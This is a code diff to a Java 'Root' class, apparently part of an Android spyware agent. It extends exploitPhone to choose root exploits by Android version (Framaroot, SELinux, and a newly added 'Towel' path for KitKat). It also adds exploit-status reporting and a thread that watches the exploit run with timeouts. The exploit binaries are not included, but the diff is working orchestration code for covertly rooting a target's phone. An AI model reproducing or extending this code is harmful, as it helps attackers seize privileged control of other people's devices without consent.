@@ -18,6 +18,7 @@ import com.android.mm.M;
 
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
@@ -26,6 +27,8 @@ import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 import java.util.Arrays;
 import java.util.Date;
+import java.util.HashMap;
+import java.util.Map;
 import java.util.Properties;
 import java.util.concurrent.Semaphore;
 
@@ -72,7 +75,7 @@ public class Root {
 		} else if (android.os.Build.VERSION.SDK_INT == 18) { // JELLY_BEAN_MR2
 			ret = !checkSELinuxExploitability();
 		} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
-			ret = true;
+			ret = !checkTowelExploitability();
 		}
 
 		if (ret) {
@@ -98,7 +101,8 @@ public class Root {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): root shell already installed, no need to exploit again");
 			}
-
+			Status.setExploitResult(Status.EXPLOIT_RESULT_NOTNEEDED);
+			Status.setExploitStatus(Status.EXPLOIT_STATUS_EXECUTED);
 			return false;
 		}
 
@@ -108,6 +112,8 @@ public class Root {
 				Check.log(TAG + "(exploitPhone): Android <= 2.1, version too old");
 			}
 			method = M.e("old");
+			Status.setExploitResult(Status.EXPLOIT_RESULT_FAIL);
+			Status.setExploitStatus(Status.EXPLOIT_STATUS_NOT_POSSIBLE);
 			return false;
 		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO
 				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO -
@@ -117,7 +123,7 @@ public class Root {
 				Check.log(TAG + "(exploitPhone): Android 2.2 to 3.2 detected attempting Framaroot");
 			}
 
-			linuxExploit(synchronous, true, false);
+			linuxExploit(synchronous, true, false, false);
 			return true;
 
 		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH
@@ -128,7 +134,7 @@ public class Root {
 						+ "(exploitPhone): Android 4.0 to 4.2 detected attempting Framaroot then SELinux exploitation");
 			}
 
-			linuxExploit(synchronous, true, true);
+			linuxExploit(synchronous, true, true, false);
 			return true;
 
 		} else if (android.os.Build.VERSION.SDK_INT == 18) { // JELLY_BEAN_MR2
@@ -136,14 +142,22 @@ public class Root {
 				Check.log(TAG + "(exploitPhone): Android 4.3 detected attempting SELinux exploitation");
 			}
 
-			linuxExploit(synchronous, false, true);
+			linuxExploit(synchronous, false, true, false);
 			return true;
 
-		} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
+		} else if (android.os.Build.VERSION.SDK_INT == 19) { // KITKAT+
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(exploitPhone): Android 4.4 detected, attempting Towel exploitation");
+			}
+			linuxExploit(synchronous, false, false,true);
+		}else if (android.os.Build.VERSION.SDK_INT > 20) { // L+
 			// Nada
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "(exploitPhone): Android >= 4.4 detected, no exploit");
+				Check.log(TAG + "(exploitPhone): Android >= 4.5 detected, no exploit");
 			}
+			Status.setExploitResult(Status.EXPLOIT_RESULT_FAIL);
+			Status.setExploitStatus(Status.EXPLOIT_STATUS_NOT_POSSIBLE);
 		}
 		return false;
 
@@ -502,27 +516,80 @@ public class Root {
 		}
 	}
 
-	private static void linuxExploit(boolean synchronous, boolean frama, boolean selinux) {
+	private static void checkExploitThread(Thread exploit,int timeOutSec){
+		/* wait for timeOutSec seconds  to see if exploits ends*/
+		long startedAt = System.currentTimeMillis();
+
+		long _secDelta = timeOutSec*(1000);
+		while(timeOutSec==0 || ((System.currentTimeMillis()-startedAt)<_secDelta))
+		{
+			try {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (checkExploitThread):"+exploit.getName());
+				}
+				exploit.join(2000);
+				if(!exploit.isAlive()) {
+					Check.log(TAG + " (checkExploitThread), exploit terminated exiting");
+					Status.setExploitStatus(Status.EXPLOIT_STATUS_EXECUTED);
+					Status.setExploitResult(PackageInfo.checkRoot()?Status.EXPLOIT_RESULT_SUCCEED:Status.EXPLOIT_RESULT_FAIL);
+					break;
+				}
+			} catch (InterruptedException e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (checkExploitThread), exception");
+				}
+
+			}
+		}
+	}
+
+	private static void linuxExploit(boolean synchronous, boolean frama, boolean selinux, boolean towel) {
+
+		class CheckExploitThread implements Runnable {
+			Thread exploit;
+			CheckExploitThread(Thread s) { exploit = s; }
+			public void run() {
+					checkExploitThread(exploit,0);
+				if (PackageInfo.checkRoot()) {
+					Status.setExploitResult(Status.EXPLOIT_RESULT_SUCCEED);
+					Status.setRoot(true);
+					Status.self().setReload();
+				}else{
+					Status.setExploitResult(Status.EXPLOIT_RESULT_FAIL);
+				}
+			}
+		}
+
+
 
 		// Start exploitation thread
-		LinuxExploitThread linuxThread = new LinuxExploitThread(frama, selinux);
+		LinuxExploitThread linuxThread = new LinuxExploitThread(frama, selinux,towel);
 		Thread exploit = new Thread(linuxThread);
+		Status.setExploitStatus(Status.EXPLOIT_STATUS_RUNNING);
 		exploit.start();
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + "(linuxExploit): exploitation thread running");
 		}
-
+		/* wait for 15 seconds  to see if exploits ends*/
+		checkExploitThread(exploit,15);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "(linuxExploit): 15 seconds passed, going synchronous="+synchronous);
+		}
 		if (synchronous) {
-			try {
-				exploit.join();
-				PackageInfo.checkRoot();
-			} catch (InterruptedException e) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (linuxExploit), exception");
-				}
+			checkExploitThread(exploit,0);
+		}else{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(linuxExploit):"+exploit.getName()+" asynchronous exploit check started");
+			}
+			if(exploit.isAlive()){
+				// start another Thread to check exploit thread end
+				CheckExploitThread checkExploitThread = new CheckExploitThread(exploit);
+				Thread ec = new Thread(checkExploitThread);
+				ec.start();
 			}
 		}
+
 
 	}
 
@@ -829,4 +896,7 @@ public class Root {
 		return 1;
 	}
 
+	public static boolean checkTowelExploitability() {
+		return false;
+	}
 }
